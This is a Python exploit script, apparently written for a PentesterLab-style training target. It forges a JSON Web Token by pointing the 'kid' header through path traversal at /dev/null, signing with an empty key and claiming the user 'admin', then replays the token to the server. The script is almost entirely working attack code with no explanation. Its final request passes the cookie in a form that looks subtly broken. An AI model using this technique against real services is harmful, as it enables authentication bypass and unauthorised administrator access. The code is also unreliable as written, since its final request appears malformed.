import base64
import requests
import hmac
import hashlib
import json

# make a request
req = requests.get('http://ptl-70dba6bd-d24fdf1d.libcurl.so/').headers

# get the cookie

cookie = req['Set-Cookie']
print(cookie)
print(len(cookie))
#
# strip the jwt

data = cookie.split()
data = data[0].strip('auth=,;')
payload = data.split('.')
header, info, signature = payload

# lets minipulate the payload

header = {"typ": "JWT", "alg": "HS256", "kid": "../../../../../../../dev/null"}
key = ''
info = {"user": 'admin'}

new_payload = base64.urlsafe_b64encode(bytes(json.dumps(header), encoding='utf8')).decode('utf8').rstrip(
    '=') + '.' + base64.urlsafe_b64encode(
    bytes(json.dumps(info), encoding='utf8')).decode('utf8').rstrip('=')
print(new_payload)
sig = base64.urlsafe_b64encode(
    hmac.new(bytes(key, encoding='utf8'), new_payload.encode('utf8'), hashlib.sha256).digest()).decode('utf8').rstrip(
    '=')

new_token = new_payload + '.' + sig
print(new_token)


#send payload

exp=requests.get('http://ptl-70dba6bd-d24fdf1d.libcurl.so/',cookies='auth='+str(new_token))
print(exp)